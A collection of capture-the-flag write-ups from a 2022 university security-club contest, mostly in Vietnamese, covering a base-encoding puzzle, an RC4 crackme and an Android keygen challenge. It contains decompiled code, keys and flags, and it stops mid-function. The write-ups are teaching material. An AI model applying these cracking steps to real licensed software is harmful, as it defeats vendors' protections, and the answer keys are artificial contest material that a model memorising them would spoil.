{"name":"write-up","tags":[],"detail":"","list":[{"name":"Fortnight Challenge 2022","tags":["https://img.shields.io/badge/Year-2022-blue.svg","https://img.shields.io/badge/Author-Computer_Security_Club-pink.svg"],"detail":"<h2>FORTNIGHT CHALLENGE 2022</h2>\n<p><img src=\"https://img.shields.io/badge/Year-2022-blue.svg\" alt=\"Year\">\n<img src=\"https://img.shields.io/badge/Author-Computer_Security_Club-pink.svg\" alt=\"Author\"></p>\n<p>Fortnight challenge 2022 l√† m·ªôt cu·ªôc thi di·ªÖn ra trong 14 ng√†y li√™n t·ª•c do Computer Security Club - University of Science, VNU - HCM t·ªï ch·ª©c v·ªõi n·ªôi dung xoay quanh c√°c ki·∫øn th·ª©c An to√†n th√¥ng tin. ƒê√¢y l√† m·ªôt s√¢n ch∆°i b·ªï √≠ch v·ªõi m·ª•c ti√™u ƒë·∫©y m·∫°nh phong tr√†o nghi√™n c·ª©u, h·ªçc t·∫≠p c≈©ng nh∆∞ n√¢ng cao hi·ªÉu bi·∫øt v·ªÅ an to√†n th√¥ng tin cho c√°c b·∫°n sinh vi√™n tr∆∞·ªùng ƒë·∫°i h·ªçc Khoa h·ªçc T·ª± nhi√™n</p>\n","list":[{"name":"Cryptography","tags":[],"detail":"","list":[{"name":"Deco de Crypto","tags":["https://img.shields.io/badge/Category-Cryptography-brightgreen.svg","https://img.shields.io/badge/Score_after_CTF-200-blue.svg","https://img.shields.io/badge/Author-SpookyFish%234588-blue.svg","https://img.shields.io/badge/Solves-34-lightgrey.svg"],"detail":"<h2>Fortnight challenge 2022: Deco de Crypto</h2>\n<p><img src=\"https://img.shields.io/badge/Category-Cryptography-brightgreen.svg\" alt=\"warmup category\"><br>\n<img src=\"https://img.shields.io/badge/Score_after_CTF-200-blue.svg\" alt=\"score\"><br>\n<img src=\"https://img.shields.io/badge/Author-SpookyFish%234588-blue.svg\" alt=\"author\"><br>\n<img src=\"https://img.shields.io/badge/Solves-34-lightgrey.svg\" alt=\"solves\"></p>\n<h3>Description</h3>\n<p>My friend Deco de Crypto sent me this and challenged me to find his message. But how am I supposed to crack this code?</p>\n<h3>Hints</h3>\n<ul>\n<li>None</li>\n</ul>\n<h3>Attached files</h3>\n<ul>\n<li><a href=\"https://github.com/compsec-hcmus/hcmus-wu/raw/main/write-up/Fortnight%20Challenge%202022/Cryptography/Deco%20de%20Crypto/encoded\">encoded</a></li>\n</ul>\n<h3>Summary</h3>\n<p>I used base 32 decode and base 64 decode</p>\n<h3>Detailed solution</h3>\n<p>[Provide the detailed solution of the ctf here.]\nSome rules:\nName of tool, name of file, name of functions, etc: put in 1 set of backtick:  <code>name of something</code>\nCode snippet, console output, other long multilines of text: put in 3 sets of backticks on a new line:\n<code>code snippet</code>\nKey ideas, name of person who invented the method, etc: put in bold <strong>name of someone</strong></p>\n<p>[some more rules here]</p>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{n01ce_ba5e5}\n</code></pre>\n","list":[]}]},{"name":"Reverse engineering","tags":[],"detail":"","list":[{"name":"ARGGGGH","tags":["https://img.shields.io/badge/Category-Reverse_Engineering-brightgreen.svg","https://img.shields.io/badge/Author-xikhud-blue.svg"],"detail":"<h2>ARGGGGH</h2>\n<p><img src=\"https://img.shields.io/badge/Category-Reverse_Engineering-brightgreen.svg\" alt=\"Category\"><br>\n<img src=\"https://img.shields.io/badge/Author-xikhud-blue.svg\" alt=\"Author\"></p>\n<h3>Description</h3>\n<p>Can you crack the password for this challenge? If you think you can, prove it. Good luck!</p>\n<h3>Summary</h3>\n<p>B√†i n√†y s·ª≠ d·ª•ng hai thu·∫≠t to√°n n·ªïi ti·∫øng l√† RC4 v√† Base64. Ngo√†i ra n√≥ c√≤n s·ª≠ d·ª•ng th·ªß thu·∫≠t <a href=\"https://github.com/adamyaxley/Obfuscate\">compile-time string literal obfuscation</a>.</p>\n<h3>Detailed solution</h3>\n<p>H√†m <code>main</code>:</p>\n<pre><code class=\"language-c\">__int64 __fastcall <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> a1, <span class=\"hljs-type\">char</span> **a2, <span class=\"hljs-type\">char</span> **a3)</span>\n{\n  <span class=\"hljs-comment\">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&quot;+&quot; TO EXPAND]</span>\n\n  v19 = __readfsqword(<span class=\"hljs-number\">0x28</span>u);\n  v3 = sub_1588();\n  v4 = (<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *)sub_1E84((__int64)v3);\n  <span class=\"hljs-built_in\">printf</span>(v4);\n  fgets(s, <span class=\"hljs-number\">256</span>, <span class=\"hljs-built_in\">stdin</span>);\n  s[<span class=\"hljs-built_in\">strlen</span>(s) - <span class=\"hljs-number\">1</span>] = <span class=\"hljs-number\">0</span>;\n  v16 = sub_24D9(s);\n  v5 = <span class=\"hljs-built_in\">strlen</span>(v16);\n  s1 = (<span class=\"hljs-type\">char</span> *)<span class=\"hljs-built_in\">calloc</span>(v5 + <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">1uLL</span>);\n  v6 = sub_16CC();\n  v7 = sub_1F32((__int64)v6);\n  sub_1500(v7, (__int64)v16, (__int64)s1);\n  v8 = sub_1844();\n  v9 = (<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *)sub_1FE0((__int64)v8);\n  <span class=\"hljs-keyword\">if</span> ( !<span class=\"hljs-built_in\">strcmp</span>(s1, v9) )\n  {\n    v10 = sub_19CC();\n    v11 = (<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *)sub_208E((__int64)v10);\n    <span class=\"hljs-built_in\">printf</span>(v11, s);\n  }\n  <span class=\"hljs-keyword\">else</span>\n  {\n    v12 = sub_1AE8(&amp;v15);\n    v13 = (<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *)sub_213C(v12);\n    <span class=\"hljs-built_in\">printf</span>(v13);\n  }\n  <span class=\"hljs-built_in\">free</span>(s1);\n  <span class=\"hljs-built_in\">free</span>(v16);\n  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0LL</span>;\n}\n</code></pre>\n<p>ƒê·ªÉ √Ω r·∫±ng trong ƒëo·∫°n code tr√™n c√≥ m·ªôt s·ªë pattern nh∆∞ sau:</p>\n<pre><code class=\"language-c\">v3 = sub_XXXX();\nv4 = (<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *)sub_YYYY((__int64)v3);\n<span class=\"hljs-built_in\">printf</span>(v4); <span class=\"hljs-comment\">// use v4, don&#x27;t have to be printf</span>\n</code></pre>\n<p>Trong ƒë√≥ h√†m <code>sub_XXXX</code> v√† <code>sub_YYYY</code> tr√¥ng gi·ªëng gi·ªëng nh∆∞ sau:</p>\n<pre><code class=\"language-c\"><span class=\"hljs-type\">void</span> *<span class=\"hljs-title function_\">sub_XXXX</span><span class=\"hljs-params\">()</span>\n{\n  <span class=\"hljs-type\">char</span> v1[<span class=\"hljs-number\">40</span>]; <span class=\"hljs-comment\">// [rsp+20h] [rbp-40h] BYREF</span>\n  <span class=\"hljs-type\">unsigned</span> __int64 v2; <span class=\"hljs-comment\">// [rsp+48h] [rbp-18h]</span>\n\n  v2 = __readfsqword(<span class=\"hljs-number\">0x28</span>u);\n  v1[<span class=\"hljs-number\">0</span>] = <span class=\"hljs-number\">71</span>;\n  v1[<span class=\"hljs-number\">1</span>] = <span class=\"hljs-number\">-12</span>;\n  v1[<span class=\"hljs-number\">2</span>] = <span class=\"hljs-number\">-101</span>;\n  v1[<span class=\"hljs-number\">3</span>] = <span class=\"hljs-number\">43</span>;\n  v1[<span class=\"hljs-number\">4</span>] = <span class=\"hljs-number\">-119</span>;\n  v1[<span class=\"hljs-number\">5</span>] = <span class=\"hljs-number\">71</span>;\n  v1[<span class=\"hljs-number\">6</span>] = <span class=\"hljs-number\">-113</span>;\n  v1[<span class=\"hljs-number\">7</span>] = <span class=\"hljs-number\">119</span>;\n  v1[<span class=\"hljs-number\">8</span>] = <span class=\"hljs-number\">121</span>;\n  v1[<span class=\"hljs-number\">9</span>] = <span class=\"hljs-number\">-20</span>;\n  v1[<span class=\"hljs-number\">10</span>] = <span class=\"hljs-number\">-101</span>;\n  v1[<span class=\"hljs-number\">11</span>] = <span class=\"hljs-number\">56</span>;\n  v1[<span class=\"hljs-number\">12</span>] = <span class=\"hljs-number\">-38</span>;\n  v1[<span class=\"hljs-number\">13</span>] = <span class=\"hljs-number\">86</span>;\n  v1[<span class=\"hljs-number\">14</span>] = <span class=\"hljs-number\">-57</span>;\n  v1[<span class=\"hljs-number\">15</span>] = <span class=\"hljs-number\">119</span>;\n  v1[<span class=\"hljs-number\">16</span>] = <span class=\"hljs-number\">55</span>;\n  v1[<span class=\"hljs-number\">17</span>] = <span class=\"hljs-number\">-24</span>;\n  v1[<span class=\"hljs-number\">18</span>] = <span class=\"hljs-number\">-97</span>;\n  v1[<span class=\"hljs-number\">19</span>] = <span class=\"hljs-number\">57</span>;\n  v1[<span class=\"hljs-number\">20</span>] = <span class=\"hljs-number\">-119</span>;\n  v1[<span class=\"hljs-number\">21</span>] = <span class=\"hljs-number\">85</span>;\n  v1[<span class=\"hljs-number\">22</span>] = <span class=\"hljs-number\">-64</span>;\n  v1[<span class=\"hljs-number\">23</span>] = <span class=\"hljs-number\">96</span>;\n  v1[<span class=\"hljs-number\">24</span>] = <span class=\"hljs-number\">115</span>;\n  v1[<span class=\"hljs-number\">25</span>] = <span class=\"hljs-number\">-94</span>;\n  v1[<span class=\"hljs-number\">26</span>] = <span class=\"hljs-number\">-34</span>;\n  v1[<span class=\"hljs-number\">27</span>] = <span class=\"hljs-number\">74</span>;\n  <span class=\"hljs-keyword\">if</span> ( (_BYTE)byte_5060 || !__cxa_guard_acquire(&amp;byte_5060) )\n    <span class=\"hljs-keyword\">return</span> &amp;unk_5040;\n  sub_1DF8(&amp;unk_5040, v1);\n  __cxa_guard_release(&amp;byte_5060);\n  __cxa_atexit(func, &amp;unk_5040, &amp;dso_handle);\n  <span class=\"hljs-keyword\">return</span> &amp;unk_5040;\n}\n\n__int64 __fastcall <span class=\"hljs-title function_\">sub_YYYY</span><span class=\"hljs-params\">(__int64 a1)</span>\n{\n  __int64 result; <span class=\"hljs-comment\">// rax</span>\n\n  result = *(<span class=\"hljs-type\">unsigned</span> __int8 *)(a1 + <span class=\"hljs-number\">28</span>);\n  <span class=\"hljs-keyword\">if</span> ( !(_BYTE)result )\n    <span class=\"hljs-keyword\">return</span> result;\n  sub_1D91(a1, <span class=\"hljs-number\">28LL</span>, <span class=\"hljs-number\">0x12AF22FA4AFE9817</span>LL); <span class=\"hljs-comment\">// xor with [0x17, 0x98, 0xFE, 0x4A, 0xFA, 0x22, 0xAF, 0x12]</span>\n  result = a1;\n  *(_BYTE *)(a1 + <span class=\"hljs-number\">28</span>) = <span class=\"hljs-number\">0</span>;\n  <span class=\"hljs-keyword\">return</span> result;\n}\n</code></pre>\n<p>Khi ƒë√≥ ƒëo·∫°n code tr√™n s·∫Ω xor <code>[71, -12, -101, 43, ...]</code> v·ªõi <code>[0x17, 0x98, 0xFE, 0x4A, 0xFA, 0x22, 0xAF, 0x12]</code> cho ra chu·ªói <code>&quot;Please enter the password: &quot;</code></p>\n<p>C√°c pattern kh√°c l√†m t∆∞∆°ng t·ª±. ƒê√¢y ch√≠nh l√† <a href=\"https://github.com/adamyaxley/Obfuscate\">compile-time string literal obfuscation</a>.</p>\n<p>ƒê·∫ßu ti√™n input c·ªßa ch√∫ng ta ƒë∆∞·ª£c ƒë∆∞a v√†o h√†m <code>sub_24D9</code>. H√†m n√†y th·ª±c ch·∫•t l√† h√†m base64 encode, nh∆∞ng l√†m sao ƒë·ªÉ nh·∫≠n di·ªán h√†m n√†y? C√≥ 1 s·ªë c√°ch:</p>\n<ul>\n<li>D√πng debugger ƒë·ªÉ quan s√°t return value sau khi ch·∫°y h√†m n√†y, s·∫Ω th·∫•y t·∫•t c·∫£ c√°c character c·ªßa n√≥ ƒë·ªÅu thu·ªôc kho·∫£ng A-Z, a-z, 0-9 v√† +, /.</li>\n<li>ƒê·ªçc code c·ªßa h√†m <code>sub_24D9</code> th·∫•y c√≥ ch·ªó <code>malloc(4 * v1 / 3 + 4)</code> v·ªõi <code>v1</code> l√† ƒë·ªô d√†i chu·ªói input. Thu·∫≠t to√°n encode m√† l√†m cho ƒë·ªô d√†i c·ªßa chu·ªói d√†i th√™m 4/3 l·∫ßn ch√≠nh l√† base64.</li>\n</ul>\n<p>Tuy nhi√™n khi c√°c b·∫°n quan s√°t gi√° tr·ªã sau khi base64 encode th√¨ s·∫Ω th·∫•y n√≥ kh√¥ng ch√≠nh x√°c so v·ªõi vi·ªác c√°c b·∫°n t·ª± encode. ƒê√≥ l√† v√¨ h√†m base64 encode c·ªßa m√¨nh s·ª≠ d·ª•ng custom alphabet (xem h√†m <code>sub_2302</code>).</p>\n<p><code>abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/</code></p>\n<p>Sau khi ƒë∆∞·ª£c base64 encode, n√≥ l·∫°i ƒë∆∞·ª£c RC4 encrypt t·∫°i h√†m <code>sub_1500</code>. C√≥ 1 s·ªë c√°ch ƒë·ªÉ bi·∫øt ƒë∆∞·ª£c h√†m n√†y l√† RC4, ƒë√£ ƒë∆∞·ª£c vi·∫øt tr√™n fanpage, <a href=\"https://www.facebook.com/hcmus.compsec.club/posts/482321203493081\">t·∫°i ƒë√¢y</a>.</p>\n<p>Cu·ªëi c√πng, sau khi ƒë∆∞·ª£c RC4 encrypt (v·ªõi key l√† <code>&quot;YEKDx2ZoxDcCFZzjnhx8Vx8y9mp7DySPhKipmz0s&quot;</code>), n√≥ s·∫Ω ƒë∆∞·ª£c so s√°nh v·ªõi m·ªôt chu·ªói hardcode b·∫±ng h√†m <code>strcmp</code>. T·ª´ ƒë√≥ ta d·ªÖ d√†ng t√¨m ƒë∆∞·ª£c flag l√†</p>\n<pre><code>flag = CustomBase64(RC4Decrypt(hardcode_string,  &quot;YEKDx2ZoxDcCFZzjnhx8Vx8y9mp7DySPhKipmz0s&quot;))\n</code></pre>\n<p><img src=\"https://github.com/compsec-hcmus/hcmus-wu/raw/main/write-up/Fortnight%20Challenge%202022/Reverse%20engineering/ARGGGGH/img.png\" alt=\"img.png\">\n<a href=\"https://gchq.github.io/CyberChef/#recipe=From_Hex('%5C%5Cx')RC4(%7B'option':'UTF8','string':'YEKDx2ZoxDcCFZzjnhx8Vx8y9mp7DySPhKipmz0s'%7D,'Latin1','Latin1')From_Base64('abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ%2B/',true)&amp;input=XHhjNVx4ZjRceGNlXHgwM1x4MmFceGQyXHhmZlx4MzhceDFlXHhiZFx4NjdceDQ5XHhlNFx4MTBceGU2XHg4Nlx4MTFceGU4XHgzYlx4MTBceDE4XHg4Nlx4ZGZceGVmXHhhOFx4YTdceDk4XHgzOFx4NjlceGFiXHhjNFx4ZWVceGUxXHg1YVx4NGFceDU0XHg4Ylx4ZTFceDAzXHgyMVx4NWNceGFmXHgxM1x4NmU\">----------------------- Link ƒë·ªÉ test -----------------------</a>.</p>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{arc4_And_base64_boizzz}\n</code></pre>\n","list":[]},{"name":"SecureKeygen","tags":["https://img.shields.io/badge/Category-Reverse_Engineering-brightgreen.svg","https://img.shields.io/badge/Author-xikhud-blue.svg"],"detail":"<h2>SecureKeygen</h2>\n<p><img src=\"https://img.shields.io/badge/Category-Reverse_Engineering-brightgreen.svg\" alt=\"Category\"><br>\n<img src=\"https://img.shields.io/badge/Author-xikhud-blue.svg\" alt=\"Author\"></p>\n<h3>Description</h3>\n<p>You dont have to buy a license if you can generate one. Please find a correct key for user ‚Äúhcmus@fortnight‚Äù. The flag will be ‚Äúf0rtn1ght{key}‚Äù (key is in lowercase)</p>\n<h3>Hints</h3>\n<ol>\n<li>Check function is written in C, not Java.</li>\n<li><a href=\"https://www.ragingrock.com/AndroidAppRE/reversing_native_libs.html\">Reference</a></li>\n<li><a href=\"https://frida.re/\">Instrumentation tool</a></li>\n</ol>\n<h3>Summary</h3>\n<p>B√†i n√†y thu·∫≠t to√°n t·∫°o key kh√° d·ªÖ, nh∆∞ng quan tr·ªçng l√† ph·∫£i bi·∫øt h√†m t·∫°o key n·∫±m ·ªü ch·ªó n√†o.</p>\n<h3>Detailed solution</h3>\n<p>B√†i n√†y c√≥ hai c√°ch gi·∫£i, m·ªôt c√°ch l√† static, t·ª©c l√† ch·ªâ ƒë·ªçc v√† ph√¢n t√≠ch code, c√≤n c√°ch th·ª© hai l√† dynamic, ·ªü c√°ch n√†y thay v√¨ hi·ªÉu code th√¨ ta s·∫Ω quan s√°t c√°c gi√° tr·ªã trong h√†m check b·∫±ng tool <a href=\"https://frida.re/\">frida</a>.</p>\n<p>ƒê·∫ßu ti√™n m·ªü app l√™n ch·∫°y\n<img src=\"https://github.com/compsec-hcmus/hcmus-wu/raw/main/write-up/Fortnight%20Challenge%202022/Reverse%20engineering/SecureKeygen/bluestack.png\" alt=\"bluestack.png\">\nApp kh√° c∆° b·∫£n, ch·ªâ c√≥ 2 √¥ ƒë·ªÉ nh·∫≠p input v√† m·ªôt n√∫t check. Ta c·∫ßn t√¨m m·ªôt key h·ª£p l·ªá cho <code>&quot;hcmus@fortnight&quot;</code>. ƒê·ªÉ decompile file apk, ta d√πng tool <a href=\"https://github.com/skylot/jadx\">jadx</a> ho·∫∑c b·∫•t c·ª© tool n√†o m√† c√°c b·∫°n bi·∫øt l√† n√≥ c√≥ th·ªÉ decompile file apk.</p>\n<pre><code class=\"language-java\"><span class=\"hljs-keyword\">package</span> com.example.securekeygen;\n\n<span class=\"hljs-keyword\">import</span> android.os.Bundle;\n<span class=\"hljs-keyword\">import</span> android.view.View;\n<span class=\"hljs-keyword\">import</span> android.widget.Button;\n<span class=\"hljs-keyword\">import</span> android.widget.EditText;\n<span class=\"hljs-keyword\">import</span> android.widget.Toast;\n<span class=\"hljs-keyword\">import</span> androidx.appcompat.app.AppCompatActivity;\n\n<span class=\"hljs-comment\">/* loaded from: classes.dex */</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MainActivity</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title class_\">AppCompatActivity</span> {\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">native</span> <span class=\"hljs-type\">boolean</span> <span class=\"hljs-title function_\">check</span><span class=\"hljs-params\">(String str, String str2)</span>;\n\n    <span class=\"hljs-keyword\">static</span> {\n        System.loadLibrary(<span class=\"hljs-string\">&quot;nativeCheck&quot;</span>);\n    }\n\n    <span class=\"hljs-meta\">@Override</span> <span class=\"hljs-comment\">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span>\n    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">onCreate</span><span class=\"hljs-params\">(Bundle bundle)</span> {\n        <span class=\"hljs-built_in\">super</span>.onCreate(bundle);\n        setContentView(R.layout.activity_main);\n        ((Button) findViewById(R.id.checkButton)).setOnClickListener(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">View</span>.OnClickListener() { <span class=\"hljs-comment\">// from class: com.example.securekeygen.MainActivity.1</span>\n            <span class=\"hljs-meta\">@Override</span> <span class=\"hljs-comment\">// android.view.View.OnClickListener</span>\n            <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">onClick</span><span class=\"hljs-params\">(View view)</span> {\n                <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">obj</span> <span class=\"hljs-operator\">=</span> ((EditText) MainActivity.<span class=\"hljs-built_in\">this</span>.findViewById(R.id.nameEditText)).getText().toString();\n                <span class=\"hljs-keyword\">if</span> (MainActivity.<span class=\"hljs-built_in\">this</span>.check(obj, ((EditText) MainActivity.<span class=\"hljs-built_in\">this</span>.findViewById(R.id.keyEditText)).getText().toString())) {\n                    Toast.makeText(MainActivity.<span class=\"hljs-built_in\">this</span>.getApplicationContext(), String.format(<span class=\"hljs-string\">&quot;Nice, you have entered the correct key of \\&quot;%s\\&quot;&quot;</span>, obj), <span class=\"hljs-number\">0</span>).show();\n                } <span class=\"hljs-keyword\">else</span> {\n                    Toast.makeText(MainActivity.<span class=\"hljs-built_in\">this</span>.getApplicationContext(), String.format(<span class=\"hljs-string\">&quot;Wrong key for user \\&quot;%s\\&quot;&quot;</span>, obj), <span class=\"hljs-number\">0</span>).show();\n                }\n            }\n        });\n    }\n}\n</code></pre>\n<p>·ªû tr√™n l√† to√†n b·ªô n·ªôi dung c·ªßa <code>com.example.securekeygen.MainActivity</code>, c√≥ th·ªÉ coi ƒë√¢y l√† h√†m ‚Äúmain‚Äù tr√™n app android.\nTa mu·ªën v√†o nh√°nh in ra m√†n m√¨nh <code>&quot;Nice, you have entered ...&quot;</code>, khi ƒë√≥ c·∫ßn c√≥:</p>\n<pre><code class=\"language-java\">MainActivity.<span class=\"hljs-built_in\">this</span>.check(obj, ((EditText) MainActivity.<span class=\"hljs-built_in\">this</span>.findViewById(R.id.keyEditText)).getText().toString()) == <span class=\"hljs-literal\">true</span>\n</code></pre>\n<p>H√†m <code>check</code> s·∫Ω th·ª±c hi·ªán vi·ªác ki·ªÉm tra key v√† name xem c√≥ h·ª£p l·ªá hay kh√¥ng, nh∆∞ng n·∫øu nh√¨n trong ƒëo·∫°n code java c·ªßa <code>MainActivity</code> th√¨ s·∫Ω kh√¥ng th·∫•y code c·ªßa h√†m <code>check</code> ƒë√¢u, m√† ch·ªâ th·∫•y ƒë·ªãnh nghƒ©a:</p>\n<pre><code class=\"language-java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">native</span> <span class=\"hljs-type\">boolean</span> <span class=\"hljs-title function_\">check</span><span class=\"hljs-params\">(String str, String str2)</span>;\n</code></pre>\n<p>ƒê√≥ l√† v√¨ h√†m n√†y kh√¥ng ƒë∆∞·ª£c vi·∫øt b·∫±ng code java m√† n√≥ ƒë∆∞·ª£c vi·∫øt b·∫±ng C (ho·∫∑c C++). Trong <a href=\"https://www.ragingrock.com/AndroidAppRE/reversing_native_libs.html\">link ·ªü hint</a> c√≥ h∆∞·ªõng d·∫´n c√°ch reverse nh·ªØng h√†m nh∆∞ v·∫≠y. C√°c b·∫°n c√≥ th·ªÉ ƒë·ªçc link tr√™n ƒë·ªÉ t√¨m hi·ªÉu th√™m, nh∆∞ng m√¨nh c√≥ th·ªÉ t√≥m g·ªçn l·∫°i c√°c √Ω nh∆∞ sau:</p>\n<ul>\n<li>N·∫øu h√†m ƒë√≥ t√™n l√† <code>check</code> th√¨ t√™n h√†m khi vi·∫øt b·∫±ng C/C++ s·∫Ω l√† <code>Java_com_example_securekeygen_MainActivity_check</code> (v√¨ t√™n c·ªßa package l√† <code>com.example.securekeygen</code>)</li>\n<li>N·∫øu trong code Java c√≥ ƒëo·∫°n code <code>System.loadLibrary(&quot;nativeCheck&quot;)</code> th√¨ file ch·ª©a code C/C++ s·∫Ω l√† file <code>libnativeCheck.so</code>. File n√†y c√≥ th·ªÉ l·∫•y ƒë∆∞·ª£c b·∫±ng c√°ch gi·∫£i n√©n file apk ra v√† t√¨m ·ªü tr√≤ng ƒë√≥.</li>\n</ul>\n<blockquote>\n<p>File apk th·∫≠t ra c≈©ng ch·ªâ l√† file zip, c√°c b·∫°n c√≥ th·ªÉ ƒë·ªïi t√™n n√≥ v·ªÅ th√†nh .zip r·ªìi d√πng winrar ƒë·ªÉ gi·∫£i n√©n n√≥.</p>\n</blockquote>\n<p>Sau khi gi·∫£i n√©n, c√°c b·∫°n s·∫Ω t√¨m th·∫•y t·∫≠n 4 file c√≥ t√™n l√† <code>libnativeCheck.so</code>, 4 file n√†y n·∫±m ·ªü 4 th∆∞ m·ª•c kh√°c nhau l√† <code>arm64-v8a</code>, <code>armeabi-v7a</code>, <code>x86</code>, <code>x86_64</code>. V·∫≠y √Ω nghƒ©a c·ªßa 4 th∆∞ m·ª•c l√† g√¨?.</p>\n<p>ƒê√≥ l√† v√¨ c√°c ƒëi·ªán tho·∫°i b√¢y gi·ªù c√≥ c√°c lo·∫°i chip kh√°c nhau, c√≥ ƒëi·ªán tho·∫°i d√πng chip arm, c√≥ c√°i x√†i intel, c√≥ c√°i 32 bit v√† c√≥ c√°i 64 bit. ƒê·ªÉ ƒë·∫£m b·∫£o app n√†y ch·∫°y ƒë∆∞·ª£c tr√™n m·ªçi lo·∫°i ƒëi·ªán tho·∫°i th√¨ m√¨nh ƒë√£ include c·∫£ 4 file n√†y v√†o. 4 file n√†y c√≥ t√°c d·ª•ng y chang nhau, ch·ªâ kh√°c v·ªÅ lo·∫°i assembly code. N√™n n·∫øu b·∫°n th√≠ch x86 th√¨ c√≥ th·ªÉ ch·ªçn file trong th∆∞ m·ª•c <code>x86</code> ƒë·ªÉ reverse, kh√¥ng th√¨ ch·ªçn file trong c√°c th∆∞ m·ª•c kh√°c c≈©ng ch·∫£ sao. M√¨nh s·∫Ω ch·ªçn file trong th∆∞ m·ª•c <code>x86</code> ƒë·ªÉ l√†m ti·∫øp b√†i n√†y. M·ªü file b·∫±ng IDA, ch·∫°y t·ªõi h√†m <code>Java_com_example_securekeygen_MainActivity_check</code>:</p>\n<pre><code class=\"language-c\"><span class=\"hljs-type\">bool</span> __cdecl <span class=\"hljs-title function_\">Java_com_example_securekeygen_MainActivity_check</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> a1, <span class=\"hljs-type\">int</span> a2, <span class=\"hljs-type\">int</span> a3, <span class=\"hljs-type\">int</span> a4)</span>\n{\n  <span class=\"hljs-comment\">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&quot;+&quot; TO EXPAND]</span>\n\n  v4 = (<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *)(*(<span class=\"hljs-type\">int</span> (__cdecl **)(<span class=\"hljs-type\">int</span>, <span class=\"hljs-type\">int</span>, _DWORD))(*(_DWORD *)a1 + <span class=\"hljs-number\">676</span>))(a1, a3, <span class=\"hljs-number\">0</span>);\n  v5 = strdup(v4);\n  (*(<span class=\"hljs-type\">void</span> (__cdecl **)(<span class=\"hljs-type\">int</span>, <span class=\"hljs-type\">int</span>, <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *))(*(_DWORD *)a1 + <span class=\"hljs-number\">680</span>))(a1, a3, v4);\n  v21 = v5;\n  v26 = <span class=\"hljs-built_in\">strlen</span>(v5);\n  v7 = (<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *)(*(<span class=\"hljs-type\">int</span> (__cdecl **)(<span class=\"hljs-type\">int</span>, <span class=\"hljs-type\">int</span>, _DWORD))(*(_DWORD *)a1 + <span class=\"hljs-number\">676</span>))(a1, a4, <span class=\"hljs-number\">0</span>);\n  v28 = strdup(v7);\n  v19 = v7;\n  v8 = v26;\n  (*(<span class=\"hljs-type\">void</span> (__cdecl **)(<span class=\"hljs-type\">int</span>, <span class=\"hljs-type\">int</span>))(*(_DWORD *)a1 + <span class=\"hljs-number\">680</span>))(a1, a4);\n  v22 = <span class=\"hljs-number\">2</span> * v26;\n  v9 = <span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-number\">2</span> * v26 + <span class=\"hljs-number\">1</span>);\n  v27 = (<span class=\"hljs-type\">char</span> *)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-number\">4</span> * v26 + <span class=\"hljs-number\">1</span>);\n  v23 = v9;\n  <span class=\"hljs-keyword\">if</span> ( v26 &lt;= <span class=\"hljs-number\">0</span> )\n  {\n    v10 = <span class=\"hljs-number\">0</span>;\n  }\n  <span class=\"hljs-keyword\">else</span>\n  {\n    <span class=\"hljs-built_in\">memcpy</span>(v9, v21, v26);\n    v10 = v26;\n  }\n  <span class=\"hljs-keyword\">if</span> ( v22 &lt;= v10 )\n  {\n    v14 = v10;\n  }\n  <span class=\"hljs-keyword\">else</span>\n  {\n    v24 = v22 + ~v10;\n    v11 = v26;\n    v12 = ((_BYTE)v22 - (_BYTE)v10) &amp; <span class=\"hljs-number\">3</span>;\n    <span class=\"hljs-keyword\">if</span> ( (((_BYTE)v22 - (_BYTE)v10) &amp; <span class=\"hljs-number\">3</span>) != <span class=\"hljs-number\">0</span> )\n    {\n      v13 = v23;\n      <span class=\"hljs-keyword\">do</span>\n      {\n        v23[v10++] = v21[--v11];\n        --v12;\n      }\n      <span class=\"hljs-keyword\">while</span> ( v12 );\n    }\n    <span class=\"hljs-keyword\">else</span>\n    {\n      v13 = v23;\n    }\n    v14 = <span class=\"hljs-number\">2</span> * v26;\n    v9 = v13;\n    v8 = v26;\n    <span class=\"hljs-keyword\">if</span> ( v24 &gt;= <span class=\"hljs-number\">3</span> )\n    {\n      v15 = &amp;v21[v11 - <span class=\"hljs-number\">1</span>];\n      <span class=\"hljs-keyword\">do</span>\n      {\n        v13[v10] = *v15;\n        v13[v10 + <span class=\"hljs-number\">1</span>] = *(v15 - <span class=\"hljs-number\">1</span>);\n        v13[v10 + <span class=\"hljs-number\">2</span>] = *(v15 - <span class=\"hljs-number\">2</span>);\n        v13[v10 + <span class=\"hljs-number\">3</span>] = *(v15 - <span class=\"hljs-number\">3</span>);\n        v10 += <span class=\"hljs-number\">4</span>;\n        v15 -= <span class=\"hljs-number\">4</span>;\n      }\n      <span class=\"hljs-keyword\">while</span> ( v22 